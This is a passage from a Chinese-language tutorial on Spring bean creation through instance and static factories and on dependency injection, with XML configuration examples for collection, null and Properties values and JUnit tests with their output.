<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	实例工厂</span></span><br><span class="line"><span class="comment">	先让 spring 容器创建一个工厂的 bean 对象。</span></span><br><span class="line"><span class="comment">	再基于这个工厂的 bean 对象，创建产品（学生）bean 对象。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stuInstanceFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;factory.StudentInstanceFactory&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">	基于工厂 bean 对象，创建产品对象</span></span><br><span class="line"><span class="comment">	factory-bean 使用的工厂 bean 对象的唯一标记，可以是 id，可以是 name</span></span><br><span class="line"><span class="comment">	factory-method 工厂 bean 对象中的工厂方法名。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;instanceFactoryStudent&quot;</span> <span class="attr">factory-bean</span>=<span class="string">&quot;stuInstanceFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;getInstance&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="在测试类中测试效果"><a href="#在测试类中测试效果" class="headerlink" title="在测试类中测试效果"></a>在测试类中测试效果</h5><p>在 TestSpring.java 中添加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSpring</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testInstanceFactory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// classpath: 代表从 classpath 下开始查找</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;classpath:applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取工厂创建的对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;instanceFactoryStudent&quot;</span>, Student.class);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">创建一个Student对象，使用无参构造方法创建对象。</span><br><span class="line">创建了学生实例工厂对象。</span><br><span class="line">Student&#123;id=<span class="number">1</span>, name=&#x27;张三&#x27;, age=<span class="number">20</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br></pre></td></tr></table></figure>

<h4 id="静态工厂"><a href="#静态工厂" class="headerlink" title="静态工厂"></a>静态工厂</h4><h5 id="创建工厂类-1"><a href="#创建工厂类-1" class="headerlink" title="创建工厂类"></a>创建工厂类</h5><p>factory 软件包创建 StudentStaticFactory 类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> factory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 静态工厂。</span></span><br><span class="line"><span class="comment"> *  当前类型不需要创建对象。直接使用静态方法，创建产品对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentStaticFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StudentStaticFactory</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学生静态工厂创建对象&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Student <span class="title function_">newInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 静态工厂方法</span></span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="配置-bean-1"><a href="#配置-bean-1" class="headerlink" title="配置 bean"></a>配置 bean</h5><p>在 applicationContext.xml 中配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">	静态工厂</span></span><br><span class="line"><span class="comment">	不需要创建工厂对象。直接使用工厂的静态方法，创建产品对象</span></span><br><span class="line"><span class="comment">	class 定义静态工厂类型</span></span><br><span class="line"><span class="comment">	factory-method 静态工厂中的工厂方法名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;staticFactoryStudent&quot;</span> <span class="attr">class</span>=<span class="string">&quot;factory.StudentStaticFactory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;newInstance&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="在测试类中测试效果-1"><a href="#在测试类中测试效果-1" class="headerlink" title="在测试类中测试效果"></a>在测试类中测试效果</h5><p>在 TestSpring.java 中添加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSpring</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testStaticFactory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;staticFactoryStudent&quot;</span>, Student.class);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">创建一个Student对象，使用无参构造方法创建对象。</span><br><span class="line">Student&#123;id=<span class="number">1</span>, name=&#x27;张三&#x27;, age=<span class="number">20</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br></pre></td></tr></table></figure>

<h2 id="属性注入"><a href="#属性注入" class="headerlink" title="属性注入"></a>属性注入</h2><p>在上面演示的都是如何实例化 Bean，下面演示的是如果给 Bean 的属性进行赋值。</p>
<p>Spring 中给 Bean 属性赋值有两种方式：</p>
<ul>
<li>构造注入（Constructor-based Dependency Injection）：通过构造方法给 bean 的属性赋值。所以要求 bean 的类中必须提供对应参数的构造方法（<strong>有参构造方法</strong>）。相当于以前创建对象时 <code>new People(1,&quot;张三&quot;);</code></li>
<li>设值注入，又称 setter 注入（Setter-based Dependency Injection）：通过 Bean 的 setter 方法赋值。所以要求 Bean 中属性必须<strong>提供 setter 方法</strong>。相当于以前的 <code>People peo = new People(); peo.setId(1); peo.setName(&quot;张三&quot;);</code></li>
</ul>
<h3 id="Spring-配置文件中的属性赋值方式"><a href="#Spring-配置文件中的属性赋值方式" class="headerlink" title="Spring 配置文件中的属性赋值方式"></a>Spring 配置文件中的属性赋值方式</h3><ol>
<li>简单类型， 8 种基本类型，对应包装类型， String 类型。直接赋值，使用 value。</li>
<li>引用类型，对象。使用其他的 bean 对象赋值。 ref。</li>
<li>数组类型。 使用标签 <code>&lt;array&gt;&lt;value&gt;&lt;/value&gt;&lt;ref&gt;&lt;/ref&gt;&lt;/array&gt;</code> 赋值。一个 array 代表一个数组。内部的子标签 value 或 ref 代表一个元素。</li>
<li>List 集合。 使用标签 <code>&lt;list&gt;&lt;value&gt;&lt;/value&gt;&lt;ref&gt;&lt;/ref&gt;&lt;/list&gt;</code> 或 <code>&lt;array&gt;</code> 赋值。一个 list 是一个集合。</li>
<li>Set 集合。 使用标签 <code>&lt;set&gt;&lt;value&gt;&lt;/value&gt;&lt;ref&gt;&lt;/ref&gt;&lt;/set&gt;</code> 赋值。一个 set 是一个集合。</li>
<li>Map 集合。 使用标签 <code>&lt;map&gt;&lt;entry key=&quot;&quot; value=&quot;&quot; key-ref=&quot;&quot; value-ref=&quot;&quot;/&gt;&lt;/map&gt;</code> 赋值。一个 map 是一个集合。一个 entry 是一个键值对。<br>key 是键，value 是简单数据值。ref 是引用对象 bean 的 id。</li>
<li>特殊的 Map 集合 Properties。使用 <code>&lt;props&gt;&lt;prop key=&quot;&quot;&gt;value&lt;/prop&gt;&lt;/props&gt;</code> 或者 <code>&lt;map&gt;</code>。一个 props 是一个 Properties 对象，<br>一个 prop 是一个键值对。</li>
<li>为任意的引用类型属性，赋值 null。<code> &lt;null/&gt;</code>。</li>
</ol>
<h3 id="构造注入"><a href="#构造注入" class="headerlink" title="构造注入"></a>构造注入</h3><h4 id="配置-bean-2"><a href="#配置-bean-2" class="headerlink" title="配置 bean"></a>配置 bean</h4><p>在配置文件 applicationContext.xml 中可以通过 <code>&lt;bean&gt;</code> 的子标签 <code>&lt;constructor-arg&gt;</code> 设置构造方法中一个参数的值。</p>
<blockquote>
<p>constructor-arg 里面有5个属性，这5个属性分为2类。</p>
<p>用来确定给哪个属性进行赋值</p>
<p>​	name：参数名称</p>
<p>​	index：参数索引。从0开始算起。</p>
<p>​	type：参数类型。8大基本数据类型可以直接写关键字。其他类型需要写类型的全限定路径。</p>
<p>​	这三个属性如果只需要用到一个就能精确的告诉 Spring，要设置的构造方法参数是哪个可以使用一个。</p>
<p>​	如果无法精确到某个构造方法参数，可以多个一起结合使用。</p>
<p>设置属性的值</p>
<p>​	value：简单数据类型直接设置。Spring 会自动进行类型转换。</p>
<p>​	ref：需要引用另一个 bean 的 id。也就是说这个参数是一个类类型，且这个类的对象也被 Spring 容器管理。</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;李四&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;30&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="在测试类中测试效果-2"><a href="#在测试类中测试效果-2" class="headerlink" title="在测试类中测试效果"></a>在测试类中测试效果</h4><p>在 TestSpring.java 中添加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSpring</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testConstructor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;student&quot;</span>, Student.class);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">有三个参数(Integer id, String name, int age)的构造方法运行</span><br><span class="line">Student&#123;id=<span class="number">10</span>, name=&#x27;李四&#x27;, age=<span class="number">30</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br></pre></td></tr></table></figure>

<h3 id="设值注入"><a href="#设值注入" class="headerlink" title="设值注入"></a>设值注入</h3><h4 id="配置-bean-3"><a href="#配置-bean-3" class="headerlink" title="配置 bean"></a>配置 bean</h4><p>spring 容器使用设置注入时，是基于 property 实现的。必须有 getter 方法。且属性命名是 property 名。<br>property 代表调用一个 setter 方法。<br>属性：<br>    name 属性名。<br>    value 要赋予的属性值。<br>    ref 要赋予的属性值，引用其他 bean 的 id。    </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;100&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;王五&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;25&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="在测试类中测试效果-3"><a href="#在测试类中测试效果-3" class="headerlink" title="在测试类中测试效果"></a>在测试类中测试效果</h4><p>在 TestSpring.java 中添加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSpring</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSetter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;student&quot;</span>, Student.class);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">创建一个Student对象，使用无参构造方法创建对象。</span><br><span class="line">setId()</span><br><span class="line">setName()</span><br><span class="line">setAge()</span><br><span class="line">Student&#123;id=<span class="number">100</span>, name=&#x27;王五&#x27;, age=<span class="number">25</span>, books=null, hobbies=null, friends=null, games=null&#125;</span><br></pre></td></tr></table></figure>

<h3 id="不同属性类型对应的写法"><a href="#不同属性类型对应的写法" class="headerlink" title="不同属性类型对应的写法"></a>不同属性类型对应的写法</h3><p>无论是构造注入还是设值注入都提供了 value 和 ref 进行设置值。</p>
<p>这两个属性只能给属性赋予简单数据类型或其他 bean 的引用。如果类的属性是数组、集合等类型需要通过下面方式进行设置。</p>
<p>这些标签都是 <code>&lt;property&gt;</code> 或 <code>&lt;constructor-args&gt;</code> 的子标签。</p>
<p>一旦使用了下面子标签方式，就不能对 <code>&lt;property&gt;</code> 或 <code>&lt;constructor-args&gt;</code> 设置 value 属性或 ref 属性。且需要在 People 类中提供对应名称，对应类型的属性。</p>
<h4 id="Set-类型"><a href="#Set-类型" class="headerlink" title="Set 类型"></a>Set 类型</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>game1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>game2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="List-类型"><a href="#List-类型" class="headerlink" title="List 类型"></a>List 类型</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>book1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>book2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Array-类型"><a href="#Array-类型" class="headerlink" title="Array 类型"></a>Array 类型</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>吃饭<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>睡觉<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Map-类型"><a href="#Map-类型" class="headerlink" title="Map 类型"></a>Map 类型</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;friends&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;基友&quot;</span> <span class="attr">value</span>=<span class="string">&quot;基友&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;闺蜜&quot;</span> <span class="attr">value</span>=<span class="string">&quot;闺蜜&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Null-值类型"><a href="#Null-值类型" class="headerlink" title="Null 值类型"></a>Null 值类型</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;phone&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">null</span>&gt;</span><span class="tag">&lt;/<span class="name">null</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="引用其他-Bean"><a href="#引用其他-Bean" class="headerlink" title="引用其他 Bean"></a>引用其他 Bean</h4><p>如果需要引用其他 Bean，直接在 property 标签中使用 ref 引用就可以。使用子标签 ref 也可以，但是没有直接用 ref 属性的方式简单。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Phone&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;phoneNo&quot;</span> <span class="attr">value</span>=<span class="string">&quot;114514&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;phone&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">null</span>&gt;</span><span class="tag">&lt;/<span class="name">null</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Properties-类型"><a href="#Properties-类型" class="headerlink" title="Properties 类型"></a>Properties 类型</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;npy&quot;</span>&gt;</span>无<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="综合："><a href="#综合：" class="headerlink" title="综合："></a>综合：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;stu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Student&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>book1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>book2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>吃饭<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>睡觉<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;friends&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;基友&quot;</span> <span class="attr">value</span>=<span class="string">&quot;基友&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;闺蜜&quot;</span> <span class="attr">value</span>=<span class="string">&quot;闺蜜&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>game1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>game2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;property name=&quot;phone&quot; ref=&quot;phone&quot;&gt;&lt;/property&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;phone&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span 